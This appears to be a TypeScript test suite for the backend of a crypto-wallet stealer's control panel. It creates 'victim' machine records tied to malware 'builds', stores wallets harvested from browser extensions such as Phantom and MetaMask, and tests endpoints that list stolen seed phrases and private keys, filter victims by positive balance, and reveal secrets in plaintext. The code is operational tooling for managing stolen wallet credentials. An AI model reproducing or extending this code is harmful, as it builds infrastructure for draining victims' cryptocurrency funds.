import { after, before, test } from 'node:test';
import assert from 'node:assert/strict';
import { randomUUID } from 'node:crypto';
import type { FastifyInstance } from 'fastify';
import { prisma } from '../server/lib/db';
import { randomToken, sha256hex } from '../server/lib/crypto';
import { upsertSecrets, upsertWallets } from '../server/services/vault';

let app: FastifyInstance;
let victimId = '';
let walletId = '';
const seed = 'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about';

before(async () => {
  const Fastify = (await import('fastify')).default;
  const { vaultRoutes } = await import('../server/routes/vault');
  const { ZodError } = await import('zod');
  const { isHttpError } = await import('../server/lib/errors');
  app = Fastify();
  app.setErrorHandler((error, _request, reply) => {
    const status = error.name === 'ZodError' ? 422 : isHttpError(error) ? error.status : 500;
    return reply.code(status).send({ error: 'request_error', message: error.message });
  });
  await app.register(vaultRoutes);

  const build = await prisma.build.create({
    data: { name: `vault-api-${randomUUID()}`, version: '0.0.0', buildId: randomUUID(), tokenHash: sha256hex(randomToken(32)), secret: randomToken(32), config: {} }
  });
  const victim = await prisma.victim.create({
    data: { buildId: build.id, hostname: `vault-api-${randomUUID().slice(0, 8)}`, os: 'windows', username: 'api', deviceTokenEnc: 'v1.00.00.00' }
  });
  victimId = victim.id;
  const wallets = await upsertWallets(victimId, [{ targetId: 'phantom', kind: 'extension', path: 'C:\\Users\\api\\phantom', state: 'locked' }]);
  walletId = wallets[0]!.id;
  await upsertSecrets(victimId, [{ walletId, kind: 'bip39-24', value: seed, words: 24 }]);
});

test('the vault listing masks secrets and groups by target', async () => {
  const response = await app.inject({ method: 'GET', url: `/victims/${victimId}/vault` });
  assert.equal(response.statusCode, 200);
  const body = response.json() as { groups: Array<{ targetId: string; wallets: Array<{ secrets: Array<Record<string, unknown>> }> }> };
  assert.equal(body.groups[0]!.targetId, 'phantom');
  const secret = body.groups[0]!.wallets[0]!.secrets[0]!;
  assert.equal(secret.value, undefined);
  assert.equal(secret.valueEnc, undefined);
  assert.match(String(secret.preview), /abandon/);
});

test('reveal returns the plain value with no-store and writes an audit row', async () => {
  const before = await prisma.auditLog.count({ where: { action: 'vault.reveal' } });
  const response = await app.inject({ method: 'GET', url: `/vault/wallets/${walletId}/reveal?kind=seed` });
  assert.equal(response.statusCode, 200);
  assert.equal(response.headers['cache-control'], 'no-store');
  assert.equal((response.json() as { value: string }).value, seed);
  const after = await prisma.auditLog.count({ where: { action: 'vault.reveal' } });
  assert.ok(after > before);
});

test('the global vault accepts empty filters and returns a chain', async () => {
  const response = await app.inject({ method: 'GET', url: '/vault?q=&chain=&state=&balance=' });
  assert.equal(response.statusCode, 200);
  const body = response.json() as { groups: Array<{ chain: string }> };
  assert.equal(body.groups[0]!.chain, 'sol');
});

after(async () => {
  await app.close();
  await prisma.victim.delete({ where: { id: victimId } }).catch(() => undefined);
});

test('counters separate seeds, keys and only positive balances', async () => {
  const seedFile = await upsertWallets(victimId, [{ targetId: 'seed-prism', kind: 'seed_file', path: 'C:\\prism\\accounts.json', state: 'decrypted', balance: '0 ETH' }]);
  await upsertSecrets(victimId, [{ walletId: seedFile[0]!.id, kind: 'hex', value: '4c16120aed3257f9f97e5976f0bb44c54ac2ae513472aa1801ae1122e866a79c' }]);
  await upsertWallets(victimId, [{ targetId: 'metamask', kind: 'extension', path: 'C:\\mm', state: 'decrypted', balance: '1.5 ETH' }]);

  const listing = await app.inject({ method: 'GET', url: `/victims/${victimId}/vault` });
  const body = listing.json() as { counters: { seeds: number; keys: number; balances: number }; groups: Array<{ targetId: string; seedFile: boolean; balanceValue: number }> };
  assert.equal(body.counters.seeds, 2);
  assert.equal(body.counters.keys, 1);
  assert.equal(body.counters.balances, 1);
  assert.equal(body.groups.find((group) => group.targetId === 'seed-prism')?.seedFile, true);
  assert.equal(body.groups.find((group) => group.targetId === 'seed-prism')?.balanceValue, 0);

  const onlyBalance = await app.inject({ method: 'GET', url: '/vault?balance=1' });
  const items = (onlyBalance.json() as { items: Array<{ targetId: string }> }).items;
  assert.ok(items.some((item) => item.targetId === 'metamask'));
  assert.ok(!items.some((item) => item.targetId === 'seed-prism'));
});

test('the secrets endpoint lists seed files and classifies hex as a private key', async () => {
  const seeds = await app.inject({ method: 'GET', url: `/vault/secrets?kind=seed&victim=${victimId}` });
  assert.equal(seeds.statusCode, 200);
  const seedItems = (seeds.json() as { items: Array<{ kind: string; wallet: { kind: string } }> }).items;
  assert.ok(seedItems.some((item) => item.kind === 'seed'));
  const fileRows = seedItems.filter((item) => item.wallet.kind === 'seed_file');
  assert.equal(fileRows.length, 1);
  assert.equal(fileRows[0]!.kind, 'seed_file');
  assert.equal(seedItems.filter((item) => item.wallet.kind === 'seed_file' && item.kind === 'private_key').length, 0);

  const keys = await app.inject({ method: 'GET', url: `/vault/secrets?kind=private_key&victim=${victimId}` });
  const keyItems = (keys.json() as { items: Array<{ kind: string }> }).items;
  assert.ok(keyItems.length >= 1);
  assert.ok(keyItems.every((item) => item.kind === 'private_key' || item.kind === 'keystore'));
});

test('reveal by secret id disambiguates several keys in one wallet', async () => {
  const wallet = await upsertWallets(victimId, [{ targetId: 'many', kind: 'seed_file', path: 'C:\\many.json', state: 'decrypted' }]);
  const values = ['a'.repeat(64), 'b'.repeat(64)];
  await upsertSecrets(victimId, values.map((value) => ({ walletId: wallet[0]!.id, kind: 'hex', value })));
  const detail = await app.inject({ method: 'GET', url: `/vault/wallets/${wallet[0]!.id}` });
  const secrets = (detail.json() as { secrets: Array<{ id: string }> }).secrets;
  const revealed: string[] = [];
  for (const secret of secrets) {
    const response = await app.inject({ method: 'GET', url: `/vault/wallets/${wallet[0]!.id}/reveal?kind=private_key&secretId=${secret.id}` });
    assert.equal(response.statusCode, 200);
    revealed.push((response.json() as { value: string }).value);
  }
  assert.deepEqual(revealed.sort(), [...values].sort());
});
